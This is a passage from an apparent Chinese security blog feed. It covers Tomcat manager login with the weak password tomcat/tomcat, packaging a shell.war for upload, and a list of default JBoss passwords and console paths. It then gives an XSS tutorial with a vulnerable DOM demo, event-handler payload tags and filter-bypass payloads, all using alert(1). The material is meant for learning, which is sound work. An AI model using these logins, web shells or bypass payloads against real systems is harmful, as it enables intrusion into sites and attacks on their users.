    &lt;span class=&#34;nt&#34;&gt;&amp;lt;role&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;rolename=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;manager-script&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class=&#34;nt&#34;&gt;&amp;lt;role&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;rolename=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;manager-jmx&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class=&#34;nt&#34;&gt;&amp;lt;role&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;rolename=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;manager-status&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class=&#34;nt&#34;&gt;&amp;lt;role&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;rolename=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;admin-gui&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class=&#34;nt&#34;&gt;&amp;lt;role&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;rolename=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;admin-script&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class=&#34;nt&#34;&gt;&amp;lt;user&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;username=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;tomcat&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;password=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;tomcat&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;roles=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script&amp;#34;&lt;/span&gt; &lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
    
&lt;span class=&#34;nt&#34;&gt;&amp;lt;/tomcat-users&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如若用户采用上述配置，即&lt;code&gt;tomcat&lt;/code&gt;用户拥有所有权限，且密码是弱口令。正常安装的情况下，tomcat8中默认没有任何用户，且manager页面只允许本地IP访问。只有管理员手工修改了这些属性的情况下，才可以进行攻击。&lt;/p&gt;
&lt;h4 id=&#34;复现-4&#34;&gt;复现&lt;/h4&gt;
&lt;p&gt;以弱密码进入：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 145; 
			flex-basis: 350px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/web-2/image-20220301171950403.png&#34; data-size=&#34;610x418&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/web-2/image-20220301171950403.png&#34;
			width=&#34;610&#34;
			height=&#34;418&#34;
			srcset=&#34;https://coollllllll.github.io/p/web-2/image-20220301171950403_hua7e48c6aec8ae902745a9154e599bea2_15847_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/web-2/image-20220301171950403_hua7e48c6aec8ae902745a9154e599bea2_15847_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;进入后台：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 212; 
			flex-basis: 509px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/web-2/image-20220301172018443.png&#34; data-size=&#34;3051x1437&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/web-2/image-20220301172018443.png&#34;
			width=&#34;3051&#34;
			height=&#34;1437&#34;
			srcset=&#34;https://coollllllll.github.io/p/web-2/image-20220301172018443_hu5da1cdb6c51213b2dd3c2dbe76b8af2a_210106_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/web-2/image-20220301172018443_hu5da1cdb6c51213b2dd3c2dbe76b8af2a_210106_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;打包war：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;jar cvf shell.war ./shell.jsp
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 478; 
			flex-basis: 1147px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/web-2/image-20220301172430348.png&#34; data-size=&#34;808x169&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/web-2/image-20220301172430348.png&#34;
			width=&#34;808&#34;
			height=&#34;169&#34;
			srcset=&#34;https://coollllllll.github.io/p/web-2/image-20220301172430348_hu780063e07576e0ffef86aa92b47aa1df_36887_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/web-2/image-20220301172430348_hu780063e07576e0ffef86aa92b47aa1df_36887_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;上传连接测试：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 198; 
			flex-basis: 476px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/web-2/image-20220301173735255.png&#34; data-size=&#34;379x191&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/web-2/image-20220301173735255.png&#34;
			width=&#34;379&#34;
			height=&#34;191&#34;
			srcset=&#34;https://coollllllll.github.io/p/web-2/image-20220301173735255_hue9984197b3e58fbe554ea594181af96b_23363_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/web-2/image-20220301173735255_hue9984197b3e58fbe554ea594181af96b_23363_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;jboss&#34;&gt;Jboss&lt;/h2&gt;
&lt;p&gt;jBoss 是 J2EE 环境中一个流行的 Web 容器，但是 jBoss 在默认安装时提供的一些功能却不 太安全，如果配置不得当，则可能直接造成远程命令执行。&lt;/p&gt;
&lt;p&gt;默认端口在8080，常见的Jboss弱口令如下：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;admin/admin
jboss/admin
admin/jboss
admin/123456
admin/password
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;控制台getshell&#34;&gt;控制台getshell&lt;/h3&gt;
&lt;h4 id=&#34;控制台地址&#34;&gt;控制台地址&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Joss4.x及其之前：console 管理路径为&lt;code&gt; /jmx-console/&lt;/code&gt; 和&lt;code&gt; /web-console/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;jboss5.x / 6.x ：Jboss5.x开始弃用了 web-console，console 管理路径为&lt;code&gt;/jmx-console/ &lt;/code&gt;和 &lt;code&gt;/admin-console/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;console的配置文件地址不同网站一般会不同。&lt;/p&gt;
&lt;h4 id=&#34;利用&#34;&gt;利用&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;Jboss4.x的jmx-console管理后台存在未授权，可以直接访问上传war包getshell&lt;/p&gt;
&lt;p&gt;5.x开始只有admin-console才可部署war包，且进入后台需要口令认证&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;待更&lt;/p&gt;
&lt;h3 id=&#34;反序列化-cve-2017-12149&#34;&gt;反序列化-CVE-2017-12149&lt;/h3&gt;
&lt;p&gt;待更&lt;/p&gt;
&lt;h3 id=&#34;反序列化-cve-2017-7504&#34;&gt;反序列化-CVE-2017-7504&lt;/h3&gt;
&lt;p&gt;待更&lt;/p&gt;
&lt;h3 id=&#34;jboss-jmxinvokerservlet-反序列化漏洞&#34;&gt;JBoss JMXInvokerServlet 反序列化漏洞&lt;/h3&gt;
&lt;p&gt;待更&lt;/p&gt;
</description>
        </item>
        <item>
        <title>XSS 相关</title>
        <link>https://coollllllll.github.io/p/xss/</link>
        <pubDate>Fri, 09 Oct 2020 00:00:00 +0000</pubDate>
        
        <guid>https://coollllllll.github.io/p/xss/</guid>
        <description>&lt;img src="https://coollllllll.github.io/p/xss/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post XSS 相关" /&gt;&lt;h1 id=&#34;xss漏洞&#34;&gt;XSS漏洞&lt;/h1&gt;
&lt;h2 id=&#34;定义和分类&#34;&gt;定义和分类&lt;/h2&gt;
&lt;p&gt;XSS(跨站脚本攻击)，指攻击者构造恶意输入并插入网页，使得在客户端执行恶意代码，对用户造成危害。&lt;/p&gt;
&lt;p&gt;可分为三类：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;反射型&lt;/li&gt;
&lt;li&gt;存储型&lt;/li&gt;
&lt;li&gt;DOM型&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;危害&#34;&gt;危害&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;盗取用户cookie&lt;/li&gt;
&lt;li&gt;键盘记录&lt;/li&gt;
&lt;li&gt;通过钓鱼盗取用户账户&lt;/li&gt;
&lt;li&gt;广告引流&lt;/li&gt;
&lt;li&gt;恶意软件或木马下载&lt;/li&gt;
&lt;li&gt;联动CSRF产生更大危害&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;反射型xss&#34;&gt;反射型XSS&lt;/h2&gt;
&lt;h3 id=&#34;原理&#34;&gt;原理&lt;/h3&gt;
&lt;p&gt;应用程序对用户的输入未经过滤或其他处理，直接输出至HTML页面，则攻击者可以在漏洞发生的位置构造好恶意代码，发送链接至用户，用户点击后产生危害。&lt;/p&gt;
&lt;h3 id=&#34;特点&#34;&gt;特点&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;非持久化，只有本地用户受影响&lt;/li&gt;
&lt;li&gt;必须发送至其他用户并点击才会产生实际影响&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;存储型xss&#34;&gt;存储型XSS&lt;/h2&gt;
&lt;h3 id=&#34;原理-1&#34;&gt;原理&lt;/h3&gt;
&lt;p&gt;用户提交的数据会被存储至后端，例如数据库，随后再通过读取数据库内容返回至前端页面。因此，攻击者可提交XSS代码用以存储，随后当读出数据并返回时会影响所有看到该页面的用户。&lt;/p&gt;
&lt;h3 id=&#34;场景&#34;&gt;场景&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;留言板、评论区&lt;/li&gt;
&lt;li&gt;用户头像、用户名字、个性签名&lt;/li&gt;
&lt;li&gt;系统通知&lt;/li&gt;
&lt;li&gt;..&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;dom型xss&#34;&gt;DOM型XSS&lt;/h2&gt;
&lt;h3 id=&#34;dom&#34;&gt;DOM&lt;/h3&gt;
&lt;p&gt;一个HTML文档可以用一个DOM树简要表述，其描述了HTML文档中标签间的相互关联性。HTML文档被解析后即转化为DOM树，因此对HTML文档的处理可以通过对DOM树的操作实现，以改变文档的结构、样式或者内容。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 112; 
			flex-basis: 270px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/xss/image-20220120102421869.png&#34; data-size=&#34;376x334&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/xss/image-20220120102421869.png&#34;
			width=&#34;376&#34;
			height=&#34;334&#34;
			srcset=&#34;https://coollllllll.github.io/p/xss/image-20220120102421869_hu82e5a119b804c444ee031e0344774301_33386_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/xss/image-20220120102421869_hu82e5a119b804c444ee031e0344774301_33386_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;原理-2&#34;&gt;原理&lt;/h3&gt;
&lt;p&gt;本质上是一种特殊类型的反射型XSS，因为其数据并没有存储至服务端以持久化，而是通过JS操作DOM对象输出特定内容至页面。&lt;/p&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;head&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;DOM Based XSS Demo&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;xsstest&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;getElementById&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;input&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;getElementById&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;output&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;innerHTML&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;img src=&amp;#39;&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#39;&amp;gt;&amp;lt;/img&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;head&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;div&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;output&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;div&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;text&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;input&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;50&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;button&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;submit&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;onclick&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;xsstest()&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上述场景：用户输入一个图片地址，点击提交后会自动将该地址拼接至img标签中并嵌入div标签。&lt;/p&gt;
&lt;p&gt;攻击者输入：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;s&amp;#39; onerror=&amp;#39;javascript:alert(1)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;即会触发img标签的error事件，随后触发xss代码进行弹窗。&lt;/p&gt;
&lt;h2 id=&#34;常用标签&#34;&gt;常用标签&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;script&lt;/li&gt;
&lt;li&gt;img/video/audio：&amp;lt;img src=&amp;rsquo;s&#39; onerror=&amp;ldquo;alert(&amp;lsquo;1&amp;rsquo;);&amp;quot;&amp;gt;、&amp;lt;video src=&amp;rsquo;s&#39; onerror=&amp;ldquo;alert(&amp;lsquo;1&amp;rsquo;);&amp;quot;&amp;gt;&lt;/li&gt;
&lt;li&gt;input：&amp;lt;input onfocus=&amp;ldquo;alert(&amp;lsquo;1&amp;rsquo;);&amp;rdquo; autofocus&amp;gt;&lt;/li&gt;
&lt;li&gt;details：&amp;lt;details open ontoggle=&amp;ldquo;alert(&amp;lsquo;1&amp;rsquo;);&amp;quot;&amp;gt;&lt;/li&gt;
&lt;li&gt;svg：&amp;lt;svg onload=alert(&amp;ldquo;xss&amp;rdquo;);&amp;gt;&lt;/li&gt;
&lt;li&gt;select：&amp;lt;select onfocus=&amp;ldquo;alert(1);&amp;rdquo; autofocus&amp;gt;&lt;/li&gt;
&lt;li&gt;iframe：&amp;lt;iframe onload=&amp;ldquo;alert(&amp;lsquo;1&amp;rsquo;);&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;、&amp;lt;iframe src=&amp;ldquo;javascript:alert(&amp;lsquo;1&amp;rsquo;)&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/li&gt;
&lt;li&gt;a：&amp;lt;a href=&amp;ldquo;javascript:alert(&amp;lsquo;1&amp;rsquo;)&amp;quot;&amp;gt;&amp;lt;/a&amp;gt;、&amp;lt;a href=&amp;rdquo;&amp;rdquo; onmouseover=&amp;ldquo;alert(&amp;lsquo;1&amp;rsquo;);&amp;quot;&amp;gt;aa&amp;lt;/a&amp;gt;&lt;/li&gt;
&lt;li&gt;form：&amp;lt;form action=&amp;ldquo;javascript:alert(&amp;lsquo;xss&amp;rsquo;)&amp;rdquo; method=&amp;ldquo;get&amp;rdquo;&amp;gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;在某些标签中嵌入脚本是无法执行的，例如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&amp;lt;title&amp;gt;&lt;/li&gt;
&lt;li&gt;&amp;lt;textarea&amp;gt;&lt;/li&gt;
&lt;li&gt;&amp;lt;xmp&amp;gt;&lt;/li&gt;
&lt;li&gt;&amp;lt;iframe&amp;gt;&lt;/li&gt;
&lt;li&gt;&amp;lt;noscript&amp;gt;&lt;/li&gt;
&lt;li&gt;&amp;lt;noframes&amp;gt;&lt;/li&gt;
&lt;li&gt;&amp;lt;plaintext&amp;gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;上述标签需要闭合后，再引入其他标签。&lt;/p&gt;
&lt;p&gt;注：&amp;lt;script&amp;gt; 和 &amp;lt;style&amp;gt;标签不支持嵌套&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;xss常见绕过&#34;&gt;XSS常见绕过&lt;/h2&gt;
&lt;h3 id=&#34;关键字过滤&#34;&gt;关键字过滤&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;陌生标签代替&lt;/li&gt;
&lt;li&gt;大小写绕过&lt;/li&gt;
&lt;li&gt;双写绕过&lt;/li&gt;
&lt;li&gt;字符拼接&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;img&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;x&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;onerror&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;a=`ale`;b=`rt`;c=&amp;#39;(`1`);&amp;#39;;eval(a+b+c)&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;

&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;window&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;top&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ale&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;rt&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;](&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;编码绕过：详见后续&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;空格过滤&#34;&gt;空格过滤&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/&lt;/code&gt;代替&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;img&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;x&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;onerror&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;alert(&amp;#39;1&amp;#39;);&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;单双引号过滤&#34;&gt;单双引号过滤&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;反引号``代替&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;img&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;`x`&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;onerror&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;alert(`1`);&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;编码绕过&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;括号过滤&#34;&gt;括号过滤&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;反引号``代替&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;alert&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`1`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;编码绕过&lt;/li&gt;
&lt;li&gt;throw语句绕过&lt;/li&gt;
&lt;/ul&gt;
